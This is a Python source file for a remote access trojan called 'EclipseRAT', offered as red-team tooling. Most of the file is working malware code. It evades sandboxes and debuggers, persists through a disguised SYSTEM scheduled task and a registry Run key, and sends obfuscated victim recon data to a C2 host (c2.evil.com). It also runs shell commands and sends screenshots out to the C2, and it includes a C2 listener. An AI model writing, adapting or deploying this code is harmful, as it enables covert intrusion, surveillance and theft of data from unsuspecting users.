#!/usr/bin/env python3
# EclipseRAT.py - Cross-Platform Stealth RAT (2026 Red Team GOAT)
# EPO - Explicit Written Permission ONLY! 💀

import socket
import sys
import time
import random
import base64
import datetime
import os
import subprocess
import getpass
import platform
import json
import threading
import ctypes
import ctypes.wintypes as wintypes
from pathlib import Path
from urllib.request import urlopen, Request
from PIL import ImageGrab  # Note: This is the only external lib - remove if you want pure stdlib

kernel32 = ctypes.windll.kernel32

# ================= CONFIG =================
DEFAULT_C2_URL = "https://c2.evil.com:443/beacon" # Change to your C2 URL
SLEEP_MIN = 15
SLEEP_MAX = 90
JITTER = 0.6
XOR_KEY = 0xC9F2A8E7

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36"
    
]

# ================= UTILITY =================
def timestamp():
    return datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")

def xor(data: bytes) -> bytes:
    return bytes(b ^ (XOR_KEY & 0xFF) for b in data)

def fake_delay(min_sec=5, max_sec=20):
    time.sleep(random.uniform(min_sec, max_sec))

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def is_sandbox():
    checks = [
        is_debugged(),
        len(os.listdir("C:\\")) < 5,
        "sandbox" in getpass.getuser().lower(),
        os.path.exists("C:\\Windows\\System32\\drivers\\vmmouse.sys")
    ]
    return any(checks)

def is_debugged():
    return kernel32.IsDebuggerPresent() != 0

# ================= PERSISTENCE =================
def add_persistence():
    if platform.system() != "Windows" or not is_admin():
        return

    # Schtasks
    cmd = f'schtasks /create /tn "WindowsTelemetry" /tr "{sys.executable} {__file__} beacon {DEFAULT_C2_URL}" /sc minute /mo 10 /ru SYSTEM /f'
    subprocess.call(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    # Registry Run
    try:
        import winreg as reg
        key = reg.OpenKey(reg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, reg.KEY_SET_VALUE)
        reg.SetValueEx(key, "TelemetryService", 0, reg.REG_SZ, f"{sys.executable} {__file__} beacon {DEFAULT_C2_URL}")
        reg.CloseKey(key)
    except:
        pass

# ================= BEACON & CONTROL =================
def beacon_loop(c2_url: str):
    backoff = SLEEP_MIN
    print(f"[{timestamp()}] EclipseRAT launching → C2: {c2_url}")

    while True:
        try:
            fake_delay(2, 10)

            # Recon data
            info = {
                "time": timestamp(),
                "hostname": platform.node(),
                "user": getpass.getuser(),
                "os": platform.system(),
                "admin": is_admin(),
                "sandbox": is_sandbox()
            }
            payload = json.dumps(info)
            obfuscated = base64.b64encode(xor(payload.encode())).decode()

            # Send beacon
            req = Request(c2_url, data=obfuscated.encode(), headers={'User-Agent': random.choice(USER_AGENTS)})
            with urlopen(req, timeout=15) as resp:
                task = resp.read().decode(errors='ignore').strip()

            if task:
                print(f"[{timestamp()}] Task: {task}")
                handle_task(task, c2_url)

            # Sleep
            sleep_time = random.randint(SLEEP_MIN, SLEEP_MAX)
            jittered = int(sleep_time * (1 + random.uniform(-JITTER, JITTER)))
            print(f"[{timestamp()}] Sleeping {jittered}s")
            time.sleep(jittered)

            backoff = SLEEP_MIN

        except Exception as e:
            print(f"[{timestamp()}] Error: {e}")
            backoff = min(backoff * 2, 3600)
            jittered = int(backoff * (1 + random.uniform(-JITTER, JITTER)))
            time.sleep(jittered)

def handle_task(task: str, c2_url: str):
    if task == "shell":
        cmd = input("Remote shell> ").strip()
        out = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT).decode(errors='ignore')
        send_result(out, c2_url)
    elif task == "screenshot":
        img = ImageGrab.grab()
        img.save("screen.png")
        with open("screen.png", "rb") as f:
            data = base64.b64encode(f.read()).decode()
        send_result(data, c2_url)
        os.remove("screen.png")
    elif task == "persist":
        add_persistence()
        send_result("Persistence added", c2_url)
    # Add more: upload, download, keylogger stub, etc.

def send_result(result: str, c2_url: str):
    obfuscated = base64.b64encode(xor(result.encode())).decode()
    req = Request(c2_url, data=obfuscated.encode(), headers={'User-Agent': random.choice(USER_AGENTS)})
    urlopen(req)

# ================= C2 LISTENER =================
def c2_listener(host: str, port: int):
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((host, port))
    server.listen(10)
    print(f"[{timestamp()}] C2 listening on {host}:{port}")

    while True:
        client, addr = server.accept()
        print(f"[{timestamp()}] New RAT from {addr}")
        data = client.recv(32768).decode(errors='ignore')
        print(data)
        task = input(f"[{addr}] Command> ").strip()
        client.send(task.encode())
        client.close()

# ================= MAIN =================
if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage:")
        print("  python EclipseRAT.py c2 <host> <port>")
        print("  python EclipseRAT.py beacon <c2_url>")
        sys.exit(1)

    mode = sys.argv[1].lower()

    if mode == "c2":
        c2_listener(sys.argv[2], int(sys.argv[3]))
    elif mode == "beacon":
        c2_url = sys.argv[2] if len(sys.argv) > 2 else DEFAULT_C2_URL
        add_persistence()
        beacon_loop(c2_url)
    else:
        print("Invalid mode")
        sys.exit(1)